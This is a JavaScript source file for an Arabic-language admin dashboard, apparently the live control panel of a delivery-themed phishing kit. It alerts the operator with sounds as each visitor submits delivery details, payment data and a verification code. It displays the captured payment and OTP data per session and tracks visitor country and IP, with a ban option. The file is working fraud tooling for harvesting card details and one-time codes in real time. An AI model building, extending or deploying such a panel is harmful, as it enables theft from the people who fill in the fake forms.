// Admin Dashboard JavaScript
const SERVER_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
  ? 'http://localhost:3000'
  : window.location.origin;

let socket = null;
let adminToken = localStorage.getItem('admin_token');
let isMuted = false;
let audioContext = null;

// Audio notification sounds using Web Audio API
const sounds = {
  newVisitor: () => playTone([523.25, 659.25, 783.99], 0.3),
  formDelivery: () => playTone([392, 523.25], 0.2, 0.1),
  formPayment: () => playTone([329.63, 392, 523.25, 659.25], 0.15, 0.1),
  formVerification: () => playTone([261.63, 329.63, 392, 523.25, 659.25, 783.99], 0.1, 0.1)
};

function playTone(frequencies, duration, gap = 0) {
  if (isMuted) return;
  
  try {
    if (!audioContext) {
      audioContext = new (window.AudioContext || window.webkitAudioContext)();
    }
    
    frequencies.forEach((freq, i) => {
      const oscillator = audioContext.createOscillator();
      const gainNode = audioContext.createGain();
      
      oscillator.connect(gainNode);
      gainNode.connect(audioContext.destination);
      
      oscillator.frequency.value = freq;
      oscillator.type = 'sine';
      
      const startTime = audioContext.currentTime + (gap * i);
      gainNode.gain.setValueAtTime(0, startTime);
      gainNode.gain.linearRampToValueAtTime(0.3, startTime + 0.05);
      gainNode.gain.linearRampToValueAtTime(0, startTime + duration);
      
      oscillator.start(startTime);
      oscillator.stop(startTime + duration);
    });
  } catch (e) {
    console.warn('Audio not supported:', e);
  }
}

// Initialize Socket Connection
function initAdminSocket() {
  return new Promise((resolve, reject) => {
    socket = io(SERVER_URL, {
      query: { sessionId: 'admin_' + Date.now() },
      transports: ['websocket', 'polling']
    });

    socket.on('connect', () => {
      console.log('🔌 Admin connected');
      updateConnectionStatus(true);
      
      if (adminToken) {
        socket.emit('admin:validate', { sessionToken: adminToken });
      }
      
      resolve(socket);
    });

    socket.on('connect_error', (error) => {
      console.error('Connection error:', error);
      updateConnectionStatus(false);
      reject(error);
    });

    socket.on('disconnect', () => {
      console.log('🔌 Admin disconnected');
      updateConnectionStatus(false);
    });

    // Admin validation response
    socket.on('admin:valid', (data) => {
      if (!data.valid) {
        localStorage.removeItem('admin_token');
        adminToken = null;
      }
    });

    socket.on('admin:forceLogout', () => {
      localStorage.removeItem('admin_token');
      adminToken = null;
      showNotification('انتهت جلستك', 'تم تسجيل خروجك من جميع الأجهزة', 'warning');
      setTimeout(() => showLoginPage(), 2000);
    });

    // Visitor events
    socket.on('visitor:new', (data) => {
      addLiveFeedItem({
        icon: '👤',
        title: 'زائر جديد',
        details: `من ${data.country || 'غير معروف'} - الصفحة: ${getPageName(data.page)}`,
        time: new Date()
      });
      sounds.newVisitor();
      updateStats();
    });

    socket.on('visitor:pageChange', (data) => {
      updateVisitorPage(data.sessionId, data.page);
    });

    socket.on('visitor:offline', (data) => {
      markVisitorOffline(data.sessionId);
      updateStats();
    });

    // Form submissions
    socket.on('form:deliverySubmitted', (data) => {
      updateVisitorData(data.sessionId, { form_submitted: true, delivery_data: data.formData });
      addLiveFeedItem({
        icon: '📝',
        title: 'إرسال نموذج التوصيل',
        details: `من ${data.country || 'غير معروف'}`,
        time: new Date()
      });
      sounds.formDelivery();
      updateStats();
    });

    socket.on('form:paymentSubmitted', (data) => {
      updateVisitorData(data.sessionId, { payment_submitted: true, payment_data: data.paymentData });
      addLiveFeedItem({
        icon: '💳',
        title: 'إرسال بيانات الدفع',
        details: `من ${data.country || 'غير معروف'}`,
        time: new Date()
      });
      sounds.formPayment();
      updateStats();
    });

    socket.on('form:verificationSubmitted', (data) => {
      updateVisitorData(data.sessionId, { verification_submitted: true, verification_data: data.verificationData });
      addLiveFeedItem({
        icon: '🔐',
        title: 'إرسال رمز التحقق',
        details: `من ${data.country || 'غير معروف'}`,
        time: new Date()
      });
      sounds.formVerification();
      updateStats();
    });
  });
}

function updateConnectionStatus(isOnline) {
  const dot = document.querySelector('.status-dot');
  const text = document.querySelector('.connection-text');
  if (dot) {
    dot.className = `status-dot ${isOnline ? 'online' : 'offline'}`;
  }
  if (text) {
    text.textContent = isOnline ? 'متصل' : 'غير متصل';
  }
}

function getPageName(page) {
  const pages = {
    'home': 'الرئيسية',
    'delivery': 'التوصيل',
    'payment': 'الدفع',
    'verification': 'التحقق'
  };
  return pages[page] || page;
}

function showNotification(title, message, type = 'info') {
  const notification = document.createElement('div');
  notification.className = 'notification';
  notification.innerHTML = `
    <span class="notification-icon">${type === 'success' ? '✓' : type === 'warning' ? '⚠' : 'ℹ'}</span>
    <div class="notification-content">
      <div class="notification-title">${title}</div>
      <div class="notification-message">${message}</div>
    </div>
  `;
  document.body.appendChild(notification);
  
  setTimeout(() => {
    notification.style.animation = 'slideDown 0.3s ease reverse';
    setTimeout(() => notification.remove(), 300);
  }, 5000);
}

function addLiveFeedItem(item) {
  const feed = document.getElementById('liveFeed');
  if (!feed) return;
  
  const html = `
    <div class="feed-item">
      <span class="feed-icon">${item.icon}</span>
      <div class="feed-content">
        <div class="feed-title">${item.title}</div>
        <div class="feed-details">${item.details}</div>
      </div>
      <span class="feed-time">${formatTime(item.time)}</span>
    </div>
  `;
  
  feed.insertAdjacentHTML('afterbegin', html);
  
  // Keep only last 50 items
  while (feed.children.length > 50) {
    feed.lastChild.remove();
  }
}

function formatTime(date) {
  return date.toLocaleTimeString('ar-OM', { hour: '2-digit', minute: '2-digit' });
}

// Stats Functions
async function updateStats() {
  if (!socket) return;
  
  socket.emit('stats:request');
  
  socket.once('stats:update', (data) => {
    const elements = {
      'totalVisitors': data.totalVisitors,
      'onlineVisitors': data.onlineVisitors,
      'formSubmissions': data.formSubmissions,
      'paymentSubmissions': data.paymentSubmissions,
      'verificationSubmissions': data.verificationSubmissions
    };
    
    Object.entries(elements).forEach(([id, value]) => {
      const el = document.getElementById(id);
      if (el) el.textContent = value;
    });
    
    // Update country chart
    const countryList = document.getElementById('countryList');
    if (countryList && data.countryStats.length > 0) {
      const maxCount = Math.max(...data.countryStats.map(c => parseInt(c.count)));
      countryList.innerHTML = data.countryStats.map(country => `
        <div class="country-item">
          <span class="country-name">${country.country || 'غير معروف'}</span>
          <div class="country-bar">
            <div class="country-bar-fill" style="width: ${(parseInt(country.count) / maxCount) * 100}%"></div>
          </div>
          <span class="country-count">${country.count}</span>
        </div>
      `).join('');
    }
  });
}

async function updateVisitorsList() {
  if (!socket) return;
  
  socket.emit('visitors:request');
  
  socket.once('visitors:update', (data) => {
    const tbody = document.getElementById('visitorsTableBody');
    if (!tbody) return;
    
    if (data.visitors.length === 0) {
      tbody.innerHTML = `
        <tr>
          <td colspan="5" class="empty-state">
            <span>📭</span>
            <p>لا يوجد زوار متصلين حالياً</p>
          </td>
        </tr>
      `;
      return;
    }
    
    tbody.innerHTML = data.visitors.map(visitor => `
      <tr data-session="${visitor.session_id}">
        <td>
          <span class="status-badge online">● متصل</span>
        </td>
        <td>${visitor.country || 'غير معروف'}</td>
        <td>${getPageName(visitor.current_page)}</td>
        <td>
          ${visitor.form_submitted ? '<span class="status-badge submitted">✓ توصيل</span>' : ''}
          ${visitor.payment_submitted ? '<span class="status-badge submitted">✓ دفع</span>' : ''}
          ${visitor.verification_submitted ? '<span class="status-badge submitted">✓ تحقق</span>' : ''}
        </td>
        <td>
          <div class="btn-group">
            <button class="btn btn-sm btn-secondary" onclick="viewVisitorData('${visitor.session_id}')">عرض</button>
            <button class="btn btn-sm btn-danger" onclick="banVisitor('${visitor.session_id}', '${visitor.ip_address}')">حظر</button>
          </div>
        </td>
      </tr>
    `).join('');
  });
}

function updateVisitorPage(sessionId, page) {
  const row = document.querySelector(`tr[data-session="${sessionId}"]`);
  if (row) {
    row.querySelector('td:nth-child(3)').textContent = getPageName(page);
  }
}

function updateVisitorData(sessionId, data) {
  const row = document.querySelector(`tr[data-session="${sessionId}"]`);
  if (row) {
    if (data.form_submitted) {
      row.querySelector('td:nth-child(4)').innerHTML += '<span class="status-badge submitted">✓ توصيل</span>';
    }
    if (data.payment_submitted) {
      row.querySelector('td:nth-child(4)').innerHTML += '<span class="status-badge submitted">✓ دفع</span>';
    }
    if (data.verification_submitted) {
      row.querySelector('td:nth-child(4)').innerHTML += '<span class="status-badge submitted">✓ تحقق</span>';
    }
  }
}

function markVisitorOffline(sessionId) {
  const row = document.querySelector(`tr[data-session="${sessionId}"]`);
  if (row) {
    row.querySelector('.status-badge')?.remove();
    row.querySelector('td:first-child').innerHTML = '<span class="status-badge offline">○ غير متصل</span>';
  }
}

// Admin Login
async function adminLogin(username, password) {
  try {
    const response = await fetch(`${SERVER_URL}/api/admin/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    });
    
    const data = await response.json();
    
    if (data.success) {
      adminToken = data.admin.id + '_' + Date.now();
      localStorage.setItem('admin_token', adminToken);
      localStorage.setItem('admin_user', JSON.stringify(data.admin));
      
      if (socket) {
        socket.emit('admin:login', {
          username,
          password: '',
          deviceInfo: {
            userAgent: navigator.userAgent,
            platform: navigator.platform
          }
        });
      }
      
      return true;
    }
    
    return false;
  } catch (error) {
    console.error('Login error:', error);
    return false;
  }
}

// Ban Functions
function banVisitor(sessionId, ipAddress) {
  const reason = prompt('أدخل سبب الحظر:');
  if (reason === null) return;
  
  const customMessage = prompt('أدخل رسالة الحظر المخصصة (اضغط موافق للرسالة الافتراضية):');
  
  if (socket) {
    socket.emit('user:ban', {
      targetSessionId: sessionId,
      targetIp: ipAddress,
      reason,
      customMessage: customMessage || 'تم حظرك من الموقع. يرجى التواصل مع الدعم.'
    });
    
    showNotification('تم الحظر', `تم حظر المستخدم بنجاح`, 'success');
    updateVisitorsList();
  }
}

// Products Functions
async function loadProducts() {
  try {
    const response = await fetch(`${SERVER_URL}/api/products`);
    const data = await response.json();
    
    const tbody = document.getElementById('productsTableBody');
    if (!tbody) return;
    
    if (!data.products || data.products.length === 0) {
      tbody.innerHTML = `
        <tr>
          <td colspan="6" class="empty-state">
            <span>📦</span>
            <p>لا توجد منتجات</p>
          </td>
        </tr>
      `;
      return;
    }
    
    tbody.innerHTML = data.products.map(product => `
      <tr>
        <td>${product.id}</td>
        <td>${product.name_ar}</td>
        <td>${product.name_en || '-'}</td>
        <td>${product.price} ر.ع</td>
        <td>${product.stock || 0}</td>
        <td>
          <div class="btn-group">
            <button class="btn btn-sm btn-warning" onclick="editProduct(${product.id})">تعديل</button>
            <button class="btn btn-sm btn-danger" onclick="deleteProduct(${product.id})">حذف</button>
          </div>
        </td>
      </tr>
    `).join('');
  } catch (error) {
    console.error('Error loading products:', error);
  }
}

function showProductModal(product = null) {
  const modal = document.getElementById('productModal');
  if (!modal) return;
  
  document.getElementById('productId').value = product?.id || '';
  document.getElementById('productNameAr').value = product?.name_ar || '';
  document.getElementById('productNameEn').value = product?.name_en || '';
  document.getElementById('productDescription').value = product?.description || '';
  document.getElementById('productPrice').value = product?.price || '';
  document.getElementById('productImage').value = product?.image_url || '';
  document.getElementById('productCategory').value = product?.category || '';
  document.getElementById('productStock').value = product?.stock || 0;
  
  modal.style.display = 'flex';
}

async function saveProduct(formData) {
  const id = formData.get('id');
  const method = id ? 'PUT' : 'POST';
  const url = id ? `${SERVER_URL}/api/products/${id}` : `${SERVER_URL}/api/products`;
  
  try {
    const response = await fetch(url, {
      method,
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(Object.fromEntries(formData))
    });
    
    const data = await response.json();
    
    if (data.success) {
      showNotification('تم الحفظ', 'تم حفظ المنتج بنجاح', 'success');
      document.getElementById('productModal').style.display = 'none';
      loadProducts();
    }
  } catch (error) {
    console.error('Error saving product:', error);
    showNotification('خطأ', 'حدث خطأ أثناء الحفظ', 'error');
  }
}

async function deleteProduct(id) {
  if (!confirm('هل أنت متأكد من حذف هذا المنتج؟')) return;
  
  try {
    await fetch(`${SERVER_URL}/api/products/${id}`, { method: 'DELETE' });
    showNotification('تم الحذف', 'تم حذف المنتج بنجاح', 'success');
    loadProducts();
  } catch (error) {
    console.error('Error deleting product:', error);
  }
}

function editProduct(id) {
  fetch(`${SERVER_URL}/api/products/${id}`)
    .then(res => res.json())
    .then(data => showProductModal(data.product))
    .catch(console.error);
}

// Device Management
async function loadDevices() {
  try {
    const response = await fetch(`${SERVER_URL}/api/admin/sessions`);
    const data = await response.json();
    
    const container = document.getElementById('devicesContainer');
    if (!container) return;
    
    if (!data.sessions || data.sessions.length === 0) {
      container.innerHTML = `
        <div class="empty-state">
          <span>📱</span>
          <p>لا توجد أجهزة متصلة</p>
        </div>
      `;
      return;
    }
    
    container.innerHTML = data.sessions.map(session => {
      const deviceInfo = session.device_info || {};
      return `
        <div class="device-item">
          <div class="device-info">
            <span class="device-icon">💻</span>
            <div class="device-details">
              <h4>${session.ip_address || 'غير معروف'}</h4>
              <p>${session.country || 'غير معروف'} - ${formatTime(new Date(session.created_at))}</p>
            </div>
          </div>
          <button class="btn btn-sm btn-danger" onclick="logoutDevice('${session.session_token}')">
            تسجيل خروج
          </button>
        </div>
      `;
    }).join('');
  } catch (error) {
    console.error('Error loading devices:', error);
  }
}

async function logoutDevice(token) {
  try {
    await fetch(`${SERVER_URL}/api/admin/sessions/${token}`, { method: 'DELETE' });
    showNotification('تم تسجيل الخروج', 'تم تسجيل خروج الجهاز بنجاح', 'success');
    loadDevices();
  } catch (error) {
    console.error('Error logging out device:', error);
  }
}

async function logoutAllDevices() {
  if (!confirm('هل أنت متأكد من تسجيل خروج جميع الأجهزة؟')) return;
  
  try {
    await fetch(`${SERVER_URL}/api/admin/sessions`, { method: 'DELETE' });
    showNotification('تم تسجيل الخروج', 'تم تسجيل خروج جميع الأجهزة', 'success');
    loadDevices();
  } catch (error) {
    console.error('Error logging out devices:', error);
  }
}

// View Visitor Data Modal
function viewVisitorData(sessionId) {
  socket.emit('visitors:request');
  socket.once('visitors:update', (data) => {
    const visitor = data.visitors.find(v => v.session_id === sessionId);
    if (visitor) {
      showVisitorModal(visitor);
    }
  });
}

function showVisitorModal(visitor) {
  const modal = document.getElementById('visitorModal');
  if (!modal) return;
  
  document.getElementById('visitorSession').textContent = visitor.session_id;
  document.getElementById('visitorCountry').textContent = visitor.country || 'غير معروف';
  document.getElementById('visitorPage').textContent = getPageName(visitor.current_page);
  document.getElementById('visitorStatus').textContent = visitor.is_online ? 'متصل' : 'غير متصل';
  
  const deliveryData = document.getElementById('visitorDelivery');
  const paymentData = document.getElementById('visitorPayment');
  const verifyData = document.getElementById('visitorVerify');
  
  deliveryData.innerHTML = visitor.delivery_data ? JSON.stringify(visitor.delivery_data, null, 2) : '-';
  paymentData.innerHTML = visitor.payment_data ? JSON.stringify(visitor.payment_data, null, 2) : '-';
  verifyData.innerHTML = visitor.verification_data ? JSON.stringify(visitor.verification_data, null, 2) : '-';
  
  modal.style.display = 'flex';
}

// Tab Navigation
function showTab(tabId) {
  document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
  document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
  
  document.getElementById(tabId)?.classList.add('active');
  document.querySelector(`[data-tab="${tabId}"]`)?.classList.add('active');
  
  // Load data for each tab
  if (tabId === 'stats') {
    updateStats();
  } else if (tabId === 'tracking') {
    updateVisitorsList();
  } else if (tabId === 'products') {
    loadProducts();
  } else if (tabId === 'devices') {
    loadDevices();
  }
}

// Toggle Sound
function toggleSound() {
  isMuted = !isMuted;
  const btn = document.querySelector('.sound-toggle');
  if (btn) {
    btn.classList.toggle('muted', isMuted);
    btn.textContent = isMuted ? '🔇' : '🔊';
  }
}

// Show Login Page
function showLoginPage() {
  document.getElementById('loginPage').style.display = 'flex';
  document.getElementById('dashboard').style.display = 'none';
}

// Show Dashboard
function showDashboard() {
  document.getElementById('loginPage').style.display = 'none';
  document.getElementById('dashboard').style.display = 'flex';
}

// Initialize
document.addEventListener('DOMContentLoaded', async () => {
  await initAdminSocket();
  
  if (!adminToken) {
    showLoginPage();
  } else {
    showDashboard();
    showTab('stats');
  }
  
  // Login form
  document.getElementById('loginForm')?.addEventListener('submit', async (e) => {
    e.preventDefault();
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    
    const success = await adminLogin(username, password);
    if (success) {
      showDashboard();
      showTab('stats');
    } else {
      showNotification('خطأ', 'اسم المستخدم أو كلمة المرور غير صحيحة', 'error');
    }
  });
  
  // Product form
  document.getElementById('productForm')?.addEventListener('submit', (e) => {
    e.preventDefault();
    saveProduct(new FormData(e.target));
  });
  
  // Logout button
  document.getElementById('logoutBtn')?.addEventListener('click', () => {
    localStorage.removeItem('admin_token');
    localStorage.removeItem('admin_user');
    adminToken = null;
    showLoginPage();
  });
  
  // Start real-time updates for tracking tab
  setInterval(() => {
    if (document.getElementById('tracking')?.classList.contains('active')) {
      updateVisitorsList();
    }
  }, 1000);
});

// Export for use in HTML
window.showTab = showTab;
window.toggleSound = toggleSound;
window.banVisitor = banVisitor;
window.viewVisitorData = viewVisitorData;
window.showProductModal = showProductModal;
window.editProduct = editProduct;
window.deleteProduct = deleteProduct;
window.logoutDevice = logoutDevice;
window.logoutAllDevices = logoutAllDevices;
